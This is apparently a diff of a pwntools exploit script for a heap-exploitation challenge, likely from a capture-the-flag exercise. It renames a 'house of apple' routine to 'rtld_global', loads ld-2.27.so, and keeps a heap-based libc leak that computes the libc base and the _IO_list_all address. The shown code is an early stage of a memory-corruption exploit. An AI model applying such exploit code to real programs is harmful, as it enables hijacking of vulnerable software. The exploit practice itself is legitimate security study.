@@ -55,7 +55,8 @@ def show(idx, size) -> bytes:
     ru("Memory shown.\n")
     return data
 
-def house_of_apple():
+def rtld_global():
+
     def leak_lib() -> int:
         add(0, 0x300)
         add(1, 0xc)
@@ -65,10 +66,11 @@ def house_of_apple():
         return libc_base
 
     libc.address = leak_lib()
+    ld = ELF('../lib/lib/ld-2.27.so')
     io_list_all = libc.symbols['_IO_list_all']
     success(f"libc.address = {hex(libc.address)}")
     success(f"io_list_all = {hex(io_list_all)}")
 
 if __name__ == '__main__':
-    house_of_apple()
+    rtld_global()
     ia()
